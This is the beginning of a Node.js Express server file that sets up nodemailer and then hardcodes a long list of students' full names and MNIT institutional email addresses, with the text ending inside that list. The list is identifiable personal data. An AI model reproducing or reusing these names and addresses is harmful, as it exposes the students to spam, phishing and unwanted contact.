require('dotenv').config();
const http                   = require('http');
const express                = require("express");
const bodyParser             = require("body-parser");
const ejs                    = require("ejs");
const app                    = express();
const methodOverride         = require("method-override");
const nodemailer = require("nodemailer");
const server =http.createServer(app);
app.use(express.static('public'));
app.set('view engine','ejs');
app.use(bodyParser.urlencoded({
    extended:true
}));

app.use(methodOverride('_method'));

const first_year=[

    {mail: '2018UEC1747@mnit.ac.in',
    name: 'Eshaan Gupta'},
    
    
    {mail: '2018UEC1779@mnit.ac.in',
    name: 'Vaibhav Singh Bhalu'},
    
    
    {mail: '2020UCH1242@mnit.ac.in',
    name: 'ANUKUL SHARMA'},
    
    
    {mail: '2020UCH1479@mnit.ac.in',
    name: 'UDDHAV JAJU'},
    
    
    {mail: '2020UCH1221@mnit.ac.in',
    name: 'ARPIT AGRAWAL'},
    
    
    {mail: '2020UCH1432@mnit.ac.in',
    name: 'SHILPA PRAJAPATI'},
    
    
    {mail: '2020UCH1435@mnit.ac.in',
    name: 'AMIT JANGID'},
    
    
    {mail: '2020UCH1935@mnit.ac.in',
    name: 'NAVYA KUNWAR'},
    
    
    {mail: '2020UCH1936@mnit.ac.in',
    name: 'UMANSHU GUPTA'},
    
    
    {mail: '2020UCH1224@mnit.ac.in',
    name: 'MANISH JHA'},
    
    
    {mail: '2020UCH1284@mnit.ac.in',
    name: 'AMOGH JHANWAR'},
    
    
    {mail: '2020UCH1934@mnit.ac.in',
    name: 'KUSHAGRA DUTT'},
    
    
    {mail: '2020UCH1263@mnit.ac.in',
    name: 'KHUSH SANGANERIA'},
    
    
    {mail: '2020UCH1395@mnit.ac.in',
    name: 'CHAITANYA TYAGI'},
    
    
    {mail: '2020UCH1484@mnit.ac.in',
    name: 'RAJAN KUMAR SHARMA'},
    
    
    {mail: '2020UCH1591@mnit.ac.in',
    name: 'DHRUV GORETA'},
    
    
    {mail: '2020UCH1258@mnit.ac.in',
    name: 'JAYESH BAHETI'},
    
    
    {mail: '2020UCH1376@mnit.ac.in',
    name: 'NUPUR RATHI'},
    
    
    {mail: '2020UCH1400@mnit.ac.in',
    name: 'PRATHMESH BHARADWAJ'},
    
    
    {mail: '2020UCH1468@mnit.ac.in',
    name: 'GOVARDHAN SINGH RATHORE'},
    
    
    {mail: '2020UCH1291@mnit.ac.in',
    name: 'PRAJJWAL SOMANI'},
    
    
    {mail: '2020UCH1437@mnit.ac.in',
    name: 'RAHUL KUMAWAT'},
    
    
    {mail: '2020UCH1916@mnit.ac.in',
    name: 'SAGARIKA SHYAM GOHAIN'},
    
    
    {mail: '2020UCH1276@mnit.ac.in',
    name: 'PRATHMESH SHARMA'},
    
    
    {mail: '2020UCH1360@mnit.ac.in',
    name: 'VIKRAM SHUKLA'},
    
    
    {mail: '2020UCH1527@mnit.ac.in',
    name: 'ABHISHEK PAL'},
    
    
    {mail: '2020UCH1569@mnit.ac.in',
    name: 'GAGANDEEP VERMA'},
    
    
    {mail: '2020UCH1942@mnit.ac.in',
    name: 'PRAJAPATI NILESH SHANKARLAL'},
    
    
    {mail: '2020UCH1274@mnit.ac.in',
    name: 'SAHIL JAGWANI'},
    
    
    {mail: '2020UCH1492@mnit.ac.in',
    name: 'ASHISH KUMAR SAINI'},
    
    
    {mail: '2020UCH1588@mnit.ac.in',
    name: 'ASHUTOSH KUMAR'},
    
    
    {mail: '2020UCH1613@mnit.ac.in',
    name: 'RENUKA MOCHI'},
    
    
    {mail: '2020UCH1594@mnit.ac.in',
    name: 'AMIT KUMAR'},
    
    
    {mail: '2020UCH1602@mnit.ac.in',
    name: 'MANISH KUMAR'},
    
    
    {mail: '2020UCH1369@mnit.ac.in',
    name: 'ARTI GUPTA'},
    
    
    {mail: '2020UCH1507@mnit.ac.in',
    name: 'ANUJ SHRESTHI'},
    
    
    {mail: '2020UCH1257@mnit.ac.in',
    name: 'KAVYA SHARMA'},
    
    
    {mail: '2020UCH1438@mnit.ac.in',
    name: 'SUSHIL CHOUDHARY'},
    
    
    {mail: '2020UCH1444@mnit.ac.in',
    name: 'RAMESHVAR KHANNA'},
    
    
    {mail: '2020UCH1617@mnit.ac.in',
    name: 'NAWAL MEENA'},
    
    
    {mail: '2020UCH1914@mnit.ac.in',
    name: 'RISHITA GUNAWAT'},
    
    
    {mail: '2020UCH1370@mnit.ac.in',
    name: 'HARSHITA NATH'},
    
    
    {mail: '2020UCH1408@mnit.ac.in',
    name: 'NAVJOT SINGH AHUJA'},
    
    
    {mail: '2020UCH1439@mnit.ac.in',
    name: 'KRATIK MANKER'},
    
    
    {mail: '2020UCH1555@mnit.ac.in',
    name: 'ADITI VERMA'},
    
    
    {mail: '2020UCH1558@mnit.ac.in',
    name: 'ANKITA KUMAWAT'},
    
    
    {mail: '2020UCH1565@mnit.ac.in',
    name: 'RAJESH KUMAR'},
    
    
    {mail: '2020UCH1255@mnit.ac.in',
    name: 'NITISH ARORA'},
    
    
    {mail: '2020UCH1275@mnit.ac.in',
    name: 'ADARSH RAI'},
    
    
    {mail: '2020UCH1401@mnit.ac.in',
    name: 'SUDHANSHU RAJ'},
    
    
    {mail: '2020UCH1608@mnit.ac.in',
    name: 'PUJA BHAGCHAND GURU'},
    
    
    {mail: '2020UCH1883@mnit.ac.in',
    name: 'NARESH KASANA'},
    
    
    {mail: '2020UCH1939@mnit.ac.in',
    name: 'SHREYASH METHI'},
    
    
    {mail: '2020UCH1228@mnit.ac.in',
    name: 'RACHIT DANGAYACH'},
    
    
    {mail: '2020UCH1440@mnit.ac.in',
    name: 'ROSHAN KUMAR'},
    
    
    {mail: '2020UCH1574@mnit.ac.in',
    name: 'RAHUL BASETHIYA'},
    
    
    {mail: '2020UCH1355@mnit.ac.in',
    name: 'PIYUSH BENIWAL'},
    
    
    {mail: '2020UCH1622@mnit.ac.in',
    name: 'SAUMYA MEENA'},
    
    
    {mail: '2020UCH1268@mnit.ac.in',
    name: 'RAHUL VIJAYVARGIYA'},
    
    
    {mail: '2020UCH1420@mnit.ac.in',
    name: 'AISHWARYA ROY'},
    
    
    {mail: '2020UCH1477@mnit.ac.in',
    name: 'HARIOM PATHAK'},
    
    
    {mail: '2020UCH1464@mnit.ac.in',
    name: 'VADODARIA RISHI SANDEEPBHAI'},
    
    
    {mail: '2020UCH1573@mnit.ac.in',
    name: 'VIKASH KUMAR PHULWARIYA'},
    
    
    {mail: '2020UCH1598@mnit.ac.in',
    name: 'MONIKA'},
    
    
    {mail: '2020UCH1894@mnit.ac.in',
    name: 'DAMINI PAKHARE'},
    
    
    {mail: '2020UCH1938@mnit.ac.in',
    name: 'VISHWASH RAUSHAN'},
    
    
    {mail: '2020UCH1286@mnit.ac.in',
    name: 'JAYANK GUPTA'},
    
    
    {mail: '2020UCH1404@mnit.ac.in',
    name: 'HEMANT KUMAR'},
    
    
    {mail: '2020UCH1487@mnit.ac.in',
    name: 'UJJWAL DHAKED'},
    
    
    {mail: '2020UCH1388@mnit.ac.in',
    name: 'VANDINI BANSAL'},
    
    
    {mail: '2020UCH1433@mnit.ac.in',
    name: 'RAHUL CHOUDHARY'},
    
    
    {mail: '2020UCH1500@mnit.ac.in',
    name: 'RAMPHOOL DHAKAR'},
    
    
    {mail: '2020UCH1634@mnit.ac.in',
    name: 'GUGULOTH SANTHOSH'},
    
    
    {mail: '2020UCH1533@mnit.ac.in',
    name: 'NIKHIL KUMAR'},
    
    
    {mail: '2020UCH1631@mnit.ac.in',
    name: 'YASH MEENA'},
    
    
    {mail: '2020UCH1348@mnit.ac.in',
    name: 'DEEPAK MOHTA'},
    
    
    {mail: '2020UCH1946@mnit.ac.in',
    name: 'R KARTHIKEYAN'},
    
    
    {mail: '2020UCH1281@mnit.ac.in',
    name: 'AARSH KUMAR SRIVASTAVA'},
    
    
    {mail: '2020UCH1382@mnit.ac.in',
    name: 'MAHI SETHI'},
    
    
    {mail: '2020UCH1416@mnit.ac.in',
    name: 'PRIYA BAJAJ'},
    
    
    {mail: '2020UCH1364@mnit.ac.in',
    name: 'TANU SHARMA'},
    
    
    {mail: '2020UCH1392@mnit.ac.in',
    name: 'ARYAN GUPTA'},
    
    
    {mail: '2020UCH1410@mnit.ac.in',
    name: 'JASWANT SINGH'},
    
    
    {mail: '2020UCH1940@mnit.ac.in',
    name: 'HARSH CHATURVEDI'},
    
    
    {mail: '2020UCH1247@mnit.ac.in',
    name: 'PRATIK DUBEY'},
    
    
    {mail: '2020UCH1414@mnit.ac.in',
    name: 'SUDHANSHU BARANWAL'},
    
    
    {mail: '2020UCH1561@mnit.ac.in',
    name: 'RUCHI'},
    
    
    {mail: '2020UCH1933@mnit.ac.in',
    name: 'NANDINI VARSHNEY'},
    
    
    {mail: '2020UCH1947@mnit.ac.in',
    name: 'ADNAN AKHTAR'},
    
    
    {mail: '2020UCH1519@mnit.ac.in',
    name: 'ANIKET PRAJAPATI'},
    
    
    {mail: '2020UCH1605@mnit.ac.in',
    name: 'TARUN VERMA'},
    
    
    {mail: '2020UCH1260@mnit.ac.in',
    name: 'ABHI BHATNAGAR'},
    
    
    {mail: '2020UCH1944@mnit.ac.in',
    name: 'VIKAS YADAV'},
    
    
    {mail: '2020UCH1546@mnit.ac.in',
    name: 'CHANCHAL PATIDAR'},
    
    
    {mail: '2020UCH1566@mnit.ac.in',
    name: 'AMAN CHANDELIA'},
    
    
    {mail: '2020UCH1584@mnit.ac.in',
    name: 'SAURABH RAJ'},
    
    
    {mail: '2020UCH1930@mnit.ac.in',
    name: 'BRIJENDRA SINGH RATHORE'},
    
    
    {mail: '2020UCH1937@mnit.ac.in',
    name: 'NISHANT CHAUDHARY'},
    
    
    {mail: '2020UCH1351@mnit.ac.in',
    name: 'PARADE PATIL HARSHWARDHAN BHASKAR'},
    
    
    {mail: '2020UCH1434@mnit.ac.in',
    name: 'PRINCE CHOUDHARY'},
    
    
    {mail: '2020UCH1581@mnit.ac.in',
    name: 'AMAN'},
    
    
    {mail: '2020UCH1931@mnit.ac.in',
    name: 'SWASTIK SHARMA'},
    
    
    {mail: '2020UCH1932@mnit.ac.in',
    name: 'SRAJAN DWIVEDI'},
    
    
    {mail: '2020UCH1949@mnit.ac.in',
    name: 'LALITA GADHWAL'},
    
    
    {mail: '2020UCH1625@mnit.ac.in',
    name: 'PENUKA RAVI VARMA'},
    
    
    {mail: '2020UCH1279@mnit.ac.in',
    name: 'AGARWAL MANTHAN KHEMCHAND'},
    
    
    {mail: '2020UCH1289@mnit.ac.in',
    name: 'AKSHAT MANTRI'},
    
    
    {mail: '2020UCH1915@mnit.ac.in',
    name: 'VANKUDOTHU VAMSHI'},
    
    
    {mail: '2020UCH1244@mnit.ac.in',
    name: 'ANSH SAXENA'},
    
    
    {mail: '2020UCH1504@mnit.ac.in',
    name: 'MITESH PATIDAR'},
    
    
    {mail: '2020UCH1552@mnit.ac.in',
    name: 'JASMINE SONY'},
    
    
    {mail: '2020UCH1406@mnit.ac.in',
    name: 'SHIVAM KHANDELWAL'},
    
    
    {mail: '2020UCH1619@mnit.ac.in',
    name: 'SURABHI JORWAL'},
    
    
    {mail: '2020UCH1577@mnit.ac.in',
    name: 'SURAJ PRAKASH PASWAN'},
    
    
    {mail: '2020UCH1272@mnit.ac.in',
    name: 'ANURAG MISHRA'},
    
    
    {mail: '2020UCH1515@mnit.ac.in',
    name: 'YASH KUMAR'},
    
    
    {mail: '2020UCH1699@mnit.ac.in',
    name: 'ABHIJEET GUPTA'},
    
    
    {mail: '2020UCE1457@mnit.ac.in',
    name: 'SUMIT KUMAR SINGH'},
    
    
    {mail: '2020UCE1498@mnit.ac.in',
    name: 'AYUSH GARG'},
    
    
    {mail: '2020UCE1704@mnit.ac.in',
    name: 'KOMAL VERMA'},
    
    
    {mail: '2020UCE1674@mnit.ac.in',
    name: 'VIVEK BAJIYA'},
    
    
    {mail: '2020UCE1453@mnit.ac.in',
    name: 'RAGHAV KHANDELWAL'},
    
    
    {mail: '2020UCE1951@mnit.ac.in',
    name: 'MUKUND MAHESHWARI'},
    
    
    {mail: '2020UCE1451@mnit.ac.in',
    name: 'PRATIK GEHLOT'},
    
    
    {mail: '2020UCE1599@mnit.ac.in',
    name: 'ADARSH KUMAR MISHRA'},
    
    
    {mail: '2020UCE1644@mnit.ac.in',
    name: 'PRADEEP RATHORE'},
    
    
    {mail: '2020UCE1973@mnit.ac.in',
    name: 'LAXMI'},
    
    
    {mail: '2020UCE1547@mnit.ac.in',
    name: 'YOGITA PATHAK'},
    
    
    {mail: '2020UCE1506@mnit.ac.in',
    name: 'CHINMAYA SINGH'},
    
    
    {mail: '2020UCE1559@mnit.ac.in',
    name: 'AYUSHI AGARWAL'},
    
    
    {mail: '2020UCE1683@mnit.ac.in',
    name: 'ANURAG RATAN'},
    
    
    {mail: '2020UCE1685@mnit.ac.in',
    name: 'UTTAM CHAND GAUTAM'},
    
    
    {mail: '2020UCE1708@mnit.ac.in',
    name: 'PRAKASH NARAYAN'},
    
    
    {mail: '2020UCE1723@mnit.ac.in',
    name: 'SHRIYA CHARAN'},
    
    
    {mail: '2020UCE1884@mnit.ac.in',
    name: 'PRERNA JAIN'},
    
    
    {mail: '2020UCE1968@mnit.ac.in',
    name: 'RAHUL YADAV'},
    
    
    {mail: '2020UCE1176@mnit.ac.in',
    name: 'TANU SHREE'},
    
    
    {mail: '2020UCE1485@mnit.ac.in',
    name: 'VISHAL KAUSHIK'},
    
    
    {mail: '2020UCE1538@mnit.ac.in',
    name: 'VEDARSHI SONI'},
    
    
    {mail: '2020UCE1712@mnit.ac.in',
    name: 'SUBHASH KUMAR YADAV'},
    
    
    {mail: '2020UCE1494@mnit.ac.in',
    name: 'HARSHIL GOYAL'},
    
    
    {mail: '2020UCE1590@mnit.ac.in',
    name: 'YASHVI BANSAL'},
    
    
    {mail: '2020UCE1675@mnit.ac.in',
    name: 'DILKESH BAIRWA'},
    
    
    {mail: '2020UCE1917@mnit.ac.in',
    name: 'NIDHI MEENA'},
    
    
    {mail: '2020UCE1970@mnit.ac.in',
    name: 'LAGAN SINGH'},
    
    
    {mail: '2020UCE1650@mnit.ac.in',
    name: 'ABHISHEK SINGH'},
    
    
    {mail: '2020UCE1740@mnit.ac.in',
    name: 'HITESH BIJARNIYA'},
    
    
    {mail: '2020UCE1564@mnit.ac.in',
    name: 'BHUMIKA JAIN'},
    
    
    {mail: '2020UCE1636@mnit.ac.in',
    name: 'ANKIT RAJ'},
    
    
    {mail: '2020UCE1610@mnit.ac.in',
    name: 'DEVENDER SINGH RATHORE'},
    
    
    {mail: '2020UCE1626@mnit.ac.in',
    name: 'TANISHK SHARMA'},
    
    
    {mail: '2020UCE1646@mnit.ac.in',
    name: 'SONU KUMAR JHA'},
    
    
    {mail: '2020UCE1553@mnit.ac.in',
    name: 'AARUSHI TRIPATHI'},
    
    
    {mail: '2020UCE1620@mnit.ac.in',
    name: 'ABHINANDAN CHATURVEDI'},
    
    
    {mail: '2020UCE1737@mnit.ac.in',
    name: 'NARAYAN TELI'},
    
    
    {mail: '2020UCE1955@mnit.ac.in',
    name: 'RAHUL SHARMA'},
    
    
    {mail: '2020UCE1567@mnit.ac.in',
    name: 'SHRUTI BHARDWAJ'},
    
    
    {mail: '2020UCE1635@mnit.ac.in',
    name: 'PRADYUMN TIWARI'},
    
    
    {mail: '2020UCE1460@mnit.ac.in',
    name: 'RAHUL PANDEY'},
    
    
    {mail: '2020UCE1624@mnit.ac.in',
    name: 'AYUSH BHARDWAJ'},
    
    
    {mail: '2020UCE1668@mnit.ac.in',
    name: 'SUMIT NAGAR'},
    
    
    {mail: '2020UCE1695@mnit.ac.in',
    name: 'AMAN PRABHAT VERMA'},
    
    
    {mail: '2020UCE1467@mnit.ac.in',
    name: 'DEVANSHU POONIA'},
    
    
    {mail: '2020UCE1658@mnit.ac.in',
    name: 'RITIK'},
    
    
    {mail: '2020UCE1717@mnit.ac.in',
    name: 'ANKIT MEENA'},
    
    
    {mail: '2020UCE1957@mnit.ac.in',
    name: 'MAHESH RAUTRAO'},
    
    
    {mail: '2020UCE1501@mnit.ac.in',
    name: 'RAHUL BOHRA'},
    
    
    {mail: '2020UCE1662@mnit.ac.in',
    name: 'UTKARSH KHETANI'},
    
    
    {mail: '2020UCE1718@mnit.ac.in',
    name: 'GARIMA POONIA'},
    
    
    {mail: '2020UCE1518@mnit.ac.in',
    name: 'SHIVA SHARMA'},
    
    
    {mail: '2020UCE1524@mnit.ac.in',
    name: 'RITIK SINGH SENGAR'},
    
    
    {mail: '2020UCE1638@mnit.ac.in',
    name: 'NIRMA KUNWAR BHAGROT'},
    
    
    {mail: '2020UCE1735@mnit.ac.in',
    name: 'UJJAWAL SINGH BAKAWAT'},
    
    
    {mail: '2020UCE1436@mnit.ac.in',
    name: 'DILPREET SINGH'},
    
    
    {mail: '2020UCE1709@mnit.ac.in',
    name: 'SHRESHTA MARLAPUDI'},
    
    
    {mail: '2020UCE1721@mnit.ac.in',
    name: 'AKANKSHA MAURYA'},
    
    
    {mail: '2020UCE1509@mnit.ac.in',
    name: 'NANDAN AGGARWAL'},
    
    
    {mail: '2020UCE1691@mnit.ac.in',
    name: 'NITISH KUMAR'},
    
    
    {mail: '2020UCE1549@mnit.ac.in',
    name: 'ROHAN YADAV'},
    
    
    {mail: '2020UCE1677@mnit.ac.in',
    name: 'SAUMYA SINGH'},
    
    
    {mail: '2020UCE1678@mnit.ac.in',
    name: 'GAURAV'},
    
    
    {mail: '2020UCE1692@mnit.ac.in',
    name: 'SHUBHAM'},
    
    
    {mail: '2020UCE1463@mnit.ac.in',
    name: 'GUNJAN KHATRI'},
    
    
    {mail: '2020UCE1481@mnit.ac.in',
    name: 'RONAK RANASARIA'},
    
    
    {mail: '2020UCE1669@mnit.ac.in',
    name: 'VIKAS KUMAR'},
    
    
    {mail: '2020UCE1534@mnit.ac.in',
    name: 'CHIRAYU GUPTA'},
    
    
    {mail: '2020UCE1700@mnit.ac.in',
    name: 'ARCHIE'},
    
    
    {mail: '2020UCE1705@mnit.ac.in',
    name: 'ROHIT KUMAR'},
    
    
    {mail: '2020UCE1724@mnit.ac.in',
    name: 'NABAM NATUNG'},
    
    
    {mail: '2020UCE1673@mnit.ac.in',
    name: 'ADITYA KURI'},
    
    
    {mail: '2020UCE1730@mnit.ac.in',
    name: 'NARENDRA KUMAR RAV'},
    
    
    {mail: '2020UCE1744@mnit.ac.in',
    name: 'VEERU SINGH'},
    
    
    {mail: '2020UCE1750@mnit.ac.in',
    name: 'AMAN KHERALIYA'},
    
    
    {mail: '2020UCE1971@mnit.ac.in',
    name: 'MONU KUMAR'},
    
    
    {mail: '2020UCE1572@mnit.ac.in',
    name: 'RENUKA DWIVEDI'},
    
    
    {mail: '2020UCE1732@mnit.ac.in',
    name: 'RUCHITA'},
    
    
    {mail: '2020UCE1680@mnit.ac.in',
    name: 'AKASH KUMAR'},
    
    
    {mail: '2020UCE1715@mnit.ac.in',
    name: 'GAURAV KUMAR MEENA'},
    
    
    {mail: '2020UCE1716@mnit.ac.in',
    name: 'KANCHAN KUMARI'},
    
    
    {mail: '2020UCE1475@mnit.ac.in',
    name: 'PRANAV SHARMA'},
    
    
    {mail: '2020UCE1603@mnit.ac.in',
    name: 'GAURAV PAHWA'},
    
    
    {mail: '2020UCE1652@mnit.ac.in',
    name: 'HARSHIT CHOUDHARY'},
    
    
    {mail: '2020UCE1694@mnit.ac.in',
    name: 'ROHAN PRAJAPATI'},
    
    
    {mail: '2020UCE1582@mnit.ac.in',
    name: 'DRISHTI'},
    
    
    {mail: '2020UCE1681@mnit.ac.in',
    name: 'SUNIL YADAV'},
    
    
    {mail: '2020UCE1698@mnit.ac.in',
    name: 'SANAT KUMAR'},
    
    
    {mail: '2020UCE1964@mnit.ac.in',
    name: 'SWARIT RAJPUT'},
    
    
    {mail: '2020UCE1689@mnit.ac.in',
    name: 'RUDRIK SOLANKI'},
    
    
    {mail: '2020UCE1726@mnit.ac.in',
    name: 'BHUKYA TAGORE'},
    
    
    {mail: '2020UCE1734@mnit.ac.in',
    name: 'AADITYA RAJ MEENA'},
    
    
    {mail: '2020UCE1657@mnit.ac.in',
    name: 'CHANDER JEET'},
    
    
    {mail: '2020UCE1711@mnit.ac.in',
    name: 'DEEPAK KUMAR MEENA'},
    
    
    {mail: '2020UCE1961@mnit.ac.in',
    name: 'RISHI KUMAR'},
    
    
    {mail: '2020UCE1578@mnit.ac.in',
    name: 'ANSHIKA SINGH'},
    
    
    {mail: '2020UCE1587@mnit.ac.in',
    name: 'SIDDHIDA PRIYADARSHINI'},
    
    
    {mail: '2020UCE1687@mnit.ac.in',
    name: 'SHIVANG YADAV'},
    
    
    {mail: '2020UCE1696@mnit.ac.in',
    name: 'AVI UTTAM'},
    
    
    {mail: '2020UCE1514@mnit.ac.in',
    name: 'LOKENDRA VIKRAM SINGH'},
    
    
    {mail: '2020UCE1521@mnit.ac.in',
    name: 'TUSHAR SINGH'},
    
    
    {mail: '2020UCE1655@mnit.ac.in',
    name: 'ASHOK KUMAR'},
    
    
    {mail: '2020UCE1665@mnit.ac.in',
    name: 'YASHVENDRA SINGH'},
    
    
    {mail: '2020UCE1671@mnit.ac.in',
    name: 'TARUN SOUGAN'},
    
    
    {mail: '2020UCE1728@mnit.ac.in',
    name: 'RATHOD SIMON'},
    
    
    {mail: '2020UCE1746@mnit.ac.in',
    name: 'MANISH KUMAR SINGH'},
    
    
    {mail: '2020UCE1953@mnit.ac.in',
    name: 'DIKSHA SINGH'},
    
    
    {mail: '2020UCE1959@mnit.ac.in',
    name: 'RAGHVENDRA BHADAURIA'},
    
    
    {mail: '2020UCE1966@mnit.ac.in',
    name: 'REEPU KUMAR GUPTA'},
    
    
    {mail: '2020UCE1688@mnit.ac.in',
    name: 'ATUL PATIDAR'},
    
    
    {mail: '2020UCE1703@mnit.ac.in',
    name: 'ADARSH SINGH'},
    
    
    {mail: '2020UCE1707@mnit.ac.in',
    name: 'SRASHTI NIMESH'},
    
    
    {mail: '2020UCE1719@mnit.ac.in',
    name: 'ANJU KUMARI'},
    
    
    {mail: '2020UCE1488@mnit.ac.in',
    name: 'YUVRAJ KOCHAR'},
    
    
    {mail: '2020UCE1639@mnit.ac.in',
    name: 'SHERRY BANSAL'},
    
    
    {mail: '2020UCE1676@mnit.ac.in',
    name: 'MOHIT KUMAWAT'},
    
    
    {mail: '2020UCE1963@mnit.ac.in',
    name: 'KUMARI NANCY'},
    
    
    {mail: '2020UCE1684@mnit.ac.in',
    name: 'ABHISHEK NAGAR'},
    
    
    {mail: '2020UCE1731@mnit.ac.in',
    name: 'LAKAVATH RAKESH'},
    
    
    {mail: '2020UCP1091@mnit.ac.in',
    name: 'HARSH'},
    
    
    {mail: '2020UCP1738@mnit.ac.in',
    name: 'SWETA SINGH'},
    
    
    {mail: '2020UCP1866@mnit.ac.in',
    name: 'NISARG SHASHWAT VAISHNAV'},
    
    
    {mail: '2020UCP1165@mnit.ac.in',
    name: 'ASMIT KUMAR PANIKA'},
    
    
    {mail: '2020UCP1781@mnit.ac.in',
    name: 'AADITI AJAY KAPRE'},
    
    
    {mail: '2020UCP1736@mnit.ac.in',
    name: 'RACHIT GUPTA'},
    
    
    {mail: '2020UCP1779@mnit.ac.in',
    name: 'KASHISH YUSUF'},
    
    
    {mail: '2020UCP1791@mnit.ac.in',
    name: 'MEHATA HITESH BHAGWAN'},
    
    
    {mail: '2020UCP1818@mnit.ac.in',
    name: 'BASWA MUKESH'},
    
    
    {mail: '2020UCP1820@mnit.ac.in',
    name: 'SACHIN KUMAR'},
    
    
    {mail: '2020UCP1052@mnit.ac.in',
    name: 'LAXMAN SINGH SAINI'},
    
    
    {mail: '2020UCP1154@mnit.ac.in',
    name: 'RAJAT'},
    
    
    {mail: '2020UCP1794@mnit.ac.in',
    name: 'ANKUR KUMAR'},
    
    
    {mail: '2018UCP1349@mnit.ac.in',
    name: 'Tanmay'},
    
    
    {mail: '2018UEC1806@mnit.ac.in',
    name: 'Mukul Bhaiya/Guruji'},
    
    
    {mail: '2020UCP1819@mnit.ac.in',
    name: 'HARSHIT SWAMI'},
    
    
    {mail: '2020UCP1030@mnit.ac.in',
    name: 'YOGESH YADAV'},
    
    
    {mail: '2020UCP1097@mnit.ac.in',
    name: 'RAMAN'},
    
    
    {mail: '2020UCP1134@mnit.ac.in',
    name: 'SANJAY GUNPAL'},
    
    
    {mail: '2020UCP1812@mnit.ac.in',
    name: 'RAHUL'},
    
    
    {mail: '2020UCP1748@mnit.ac.in',
    name: 'MOHIT VIJAY'},
    
    
    {mail: '2020UCP1760@mnit.ac.in',
    name: 'AAYUSH MISHRA'},
    
    
    {mail: '2020UCP1782@mnit.ac.in',
    name: 'ANANYA JAIN'},
    
    
    {mail: '2020UCP1796@mnit.ac.in',
    name: 'MRIDUL JAIN'},
    
    
    {mail: '2020UCP1813@mnit.ac.in',
    name: 'CHUNDURI VIVEK CHOWDARY'},
    
    
    {mail: '2020UCP1864@mnit.ac.in',
    name: 'SNEHAL BHATNAGAR'},
    
    
    {mail: '2020UCP1977@mnit.ac.in',
    name: 'SHUKLA JAY SANJIVKUMAR'},
    
    
    {mail: '2020UCP1068@mnit.ac.in',
    name: 'KHWAHISH MALVIYA'},
    
    
    {mail: '2020UCP1129@mnit.ac.in',
    name: 'PRABAL SINGH PARIHAR'},
    
    
    {mail: '2020UCP1159@mnit.ac.in',
    name: 'KAPIL PRATIHAR'},
    
    
    {mail: '2020UCP1776@mnit.ac.in',
    name: 'HIMESH HEMANG MANIYAR'},
    
    
    {mail: '2020UCP1984@mnit.ac.in',
    name: 'SANKET'},
    
    
    {mail: '2020UCP1024@mnit.ac.in',
    name: 'SUDAMA DHAKAD'},
    
    
    {mail: '2020UCP1828@mnit.ac.in',
    name: 'GAJENDRA SINGH'},
    
    
    {mail: '2020UCP1061@mnit.ac.in',
    name: 'SAHIL YADAV'},
    
    
    {mail: '2020UCP1862@mnit.ac.in',
    name: 'HARSHITA JAJANI'},
    
    
    {mail: '2020UCP1021@mnit.ac.in',
    name: 'SATYAM KUMAR'},
    
    
    {mail: '2020UCP1764@mnit.ac.in',
    name: 'HARSH SHARMA'},
    
    
    {mail: '2020UCP1790@mnit.ac.in',
    name: 'MEDHA JAIN'},
    
    
    {mail: '2020UCP1799@mnit.ac.in',
    name: 'RAHUL SHARMA'},
    
    
    {mail: '2020UCP1863@mnit.ac.in',
    name: 'AASHVI ASHISH SHAH'},
    
    
    {mail: '2020UCP1978@mnit.ac.in',
    name: 'PRINCE KUMAR PANDEY'},
    
    
    {mail: '2020UCP1753@mnit.ac.in',
    name: 'SAMAR SINGH RANDHAWA'},
    
    
    {mail: '2020UCP1808@mnit.ac.in',
    name: 'HRITUL MANGAL'},
    
    
    {mail: '2020UCP1018@mnit.ac.in',
    name: 'VISHNU MALI'},
    
    
    {mail: '2020UCP1778@mnit.ac.in',
    name: 'TANISHQ KAKKAR'},
    
    
    {mail: '2020UCP1817@mnit.ac.in',
    name: 'TANISHK AGRAWAL'},
    
    
    {mail: '2020UCP1075@mnit.ac.in',
    name: 'MEENAL YADAV'},
    
    
    {mail: '2020UCP1119@mnit.ac.in',
    name: 'ROHIT'},
    
    
    {mail: '2020UCP1795@mnit.ac.in',
    name: 'TANMAY MITTAL'},
    
    
    {mail: '2020UCP1822@mnit.ac.in',
    name: 'RAHUL SAINI'},
    
    
    {mail: '2020UCP1025@mnit.ac.in',
    name: 'MOHAK'},
    
    
    {mail: '2020UCP1139@mnit.ac.in',
    name: 'DEVASHISH BADARIA'},
    
    
    {mail: '2020UCP1144@mnit.ac.in',
    name: 'ANSHUL SINGH'},
    
    
    {mail: '2020UCP1157@mnit.ac.in',
    name: 'RITU MEENA'},
    
    
    {mail: '2020UCP1161@mnit.ac.in',
    name: 'DEEPJYOTI BRAHMA'},
    
    
    {mail: '2020UCP1761@mnit.ac.in',
    name: 'MOHAMMAD SHAFIN QURESHI'},
    
    
    {mail: '2020UCP1809@mnit.ac.in',
    name: 'AMAN MAHESHWARI'},
    
    
    {mail: '2020UCP1975@mnit.ac.in',
    name: 'GRAHIL SINGHAL'},
    
    
    {mail: '2020UCP1798@mnit.ac.in',
    name: 'PATEL JEEL NRUPESHKUMAR'},
    
    
    {mail: '2020UCP1143@mnit.ac.in',
    name: 'SURBHI CHHAYA'},
    
    
    {mail: '2020UCP1827@mnit.ac.in',
    name: 'LAKSHYARAJ SINGH RAO'},
    
    
    {mail: '2020UCP1877@mnit.ac.in',
    name: 'VARAD DHIMAN'},
    
    
    {mail: '2020UCP1110@mnit.ac.in',
    name: 'PRAVEEN KUMAR'},
    
    
    {mail: '2020UCP1124@mnit.ac.in',
    name: 'RAHUL GUROO'},
    
    
    {mail: '2020UCP1151@mnit.ac.in',
    name: 'TANU ATAL'},
    
    
    {mail: '2020UCP1801@mnit.ac.in',
    name: 'SAKSHAM KUMAR BINDAL'},
    
    
    {mail: '2020UCP1816@mnit.ac.in',
    name: 'DHARMESH SHARMA'},
    
    
    {mail: '2020UCP1011@mnit.ac.in',
    name: 'ANISH JANGIR'},
    
    
    {mail: '2020UCP1749@mnit.ac.in',
    name: 'TARUN GOYAL'},
    
    
    {mail: '2020UCP1785@mnit.ac.in',
    name: 'GOURI PADHA'},
    
    
    {mail: '2020UCP1788@mnit.ac.in',
    name: 'SAJIA ALI'},
    
    
    {mail: '2020UCP1810@mnit.ac.in',
    name: 'PARAG JAIN'},
    
    
    {mail: '2020UCP1786@mnit.ac.in',
    name: 'YUGANSHI AGRAWAL'},
    
    
    {mail: '2020UCP1815@mnit.ac.in',
    name: 'PADALA ANVESH REDDY'},
    
    
    {mail: '2020UCP1126@mnit.ac.in',
    name: 'HARSH PRATAP SINGH'},
    
    
    {mail: '2020UCP1919@mnit.ac.in',
    name: 'YASHMANI SINGH'},
    
    
